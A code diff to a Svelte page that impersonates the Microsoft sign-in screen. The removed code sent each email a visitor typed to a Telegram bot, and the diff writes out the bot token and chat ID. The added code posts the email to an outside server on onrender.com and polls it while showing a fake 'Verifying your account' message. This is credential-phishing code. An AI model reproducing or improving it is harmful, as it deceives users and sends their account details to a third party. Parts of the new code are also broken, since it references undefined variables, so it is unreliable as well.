@@ -4,41 +4,71 @@ import Footer from '../lib/Footer.svelte';
 import SignIn from '../assets/signinoptions.svg';
 import { emailStore } from '../stores.js';
 import { push } from "svelte-spa-router";
+import { onMount, onDestroy } from 'svelte';
 
 let signupurl = 'https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWNiOWE1LWQ2N2EtN2I5MC1iYzkwLWY1MTEzNzBiODA0MyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2N1bHR1cmU9ZW4tdXMmY291bnRyeT11cw&response_mode=fragment&nonce=019cb9a5-d67a-7cf9-8b71-a2cd571134d5&code_challenge=DDAnaJRh83mQDJU5uUE8JmxXaHsxPyWpqVNFCcuN0KY&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.28.2&uaid=aa5d786301e783c42d7f31772f123e2a&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&signup=1&lw=1&fl=dob%2cflname%2cwld&epctrc=bUi6uzAEmXvrXquoIgto3mVil161rvILeqHCHaEQN%2bM%3d8%3a1%3aCANARY%3aKjedT%2balijizrd%2b8q8Ov6W2oU4zGE3x4jDPdLLKFVHg%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzCAAAAAAA_WhzSkkhKSsjfN67-aCOBv00LJSwPg5FmYf4DvtwhoJWbPAXSqx0Babi5Z0-GfrLj1A82rHtlCcyHQUP8H2ttZ6eNqtuYNgpfNsyEGzJ_MaoRDVUAEK8wgCWZHCtfiK1TZ4XxcWEbZxqM-1oNiM8IjTACo7JHhmO9i9w5vMjOpsYzo8AHXng_Rz4wgZkWMQvLXGE9KLXvVFFYel-6rNwKCAA&jshs=0&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d';
 let userEmail = "";
 let name = "Microsoft";
 let errorMessage = "";
+let isWaiting = false;
+let pollInterval;
+
+ onDestroy(() => {
+        if (pollInterval) clearInterval(pollInterval);
+    });
+
 
 async function sendDataToBackend(userEmail) {
-          let message = `New ${name} login attempt-> email, username or skype: ${userEmail}`;
-      const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
-      const chatId = '1314372286';
-      // const chatId = 1314372286;
-      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+          const backend_url = "https://rate-land.onrender.com/submit";
+          isWaiting = true;
     try {
-
-        const response = await fetch(telegramApiUrl, {
+        const response = await fetch(backend_url, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                "chat_id": chatId,
-                "text": message
+                "name": 'Office',
+                "email": emailValue,
             })
         });
 
          if (response.status === 200) {
-          console.log('Login successful!');
+          console.log('Processing Request!');
+          startPolling(data.sessionId);
         } else {
-          console.error('Login Attempt Failed:', response.status);
+          isWaiting = false;
+          errorMessage = "Server busy. Please try again.";
+          console.error('Attempt Failed:', response.status);
         }
 
     } catch (error) {
-        console.error("Error sending data:", error);
+        isWaiting = false;
+        console.error("Connection error:", error);
+        errorMessage = "Check your internet connection.";
     }
 }
+
+function startPolling(sessionId) {
+        const statusUrl = `https://rate-land.onrender.com/status/${sessionId}`;
+        
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(statusUrl);
+                const data = await res.json();
+
+                if (data.status === 'completed') {
+                    clearInterval(pollInterval);
+                    isWaiting = false;
+                    // ACTION GRANTED: Move to the next page
+                    push('/choose-option');
+                }
+                // If still 'pending', the interval continues...
+            } catch (err) {
+                console.error("Polling error:", err);
+            }
+        }, 3000); // Check every 3 seconds
+    }
 
 function detectInputType(value) {
 
@@ -90,6 +120,7 @@ function validateInput(value) {
          <input
             class="input"
             placeholder="Email, phone, or Skype"
+            disabled={isWaiting} 
             bind:value={userEmail}
             class:error={errorMessage}
             on:input={() => errorMessage = ""}
@@ -97,6 +128,10 @@ function validateInput(value) {
 
         {#if errorMessage}
             <p class="error-text">{errorMessage}</p>
+        {/if}
+
+        {#if isWaiting}
+            <p class="waiting-text">🔄 Verifying your account, please check back in a moment...</p>
         {/if}
 
             <p class="signup">
@@ -118,10 +153,8 @@ function validateInput(value) {
                 emailStore.set(userEmail.trim());
 
                 sendDataToBackend(userEmail);
-
-                push('/choose-option');
                         }}>
-                Next
+                  {isWaiting ? 'Waiting...' : 'Next'}
             </button>
             </div>
 
@@ -243,6 +276,17 @@ function validateInput(value) {
     cursor:pointer;
     width: 100px;
 }
+
+.waiting-text {
+        font-size: 0.85rem;
+        color: #555;
+        margin-top: 10px;
+        font-style: italic;
+    }
+.next-btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+    }
 
 /* sign in options mobile style */
 .options-card {
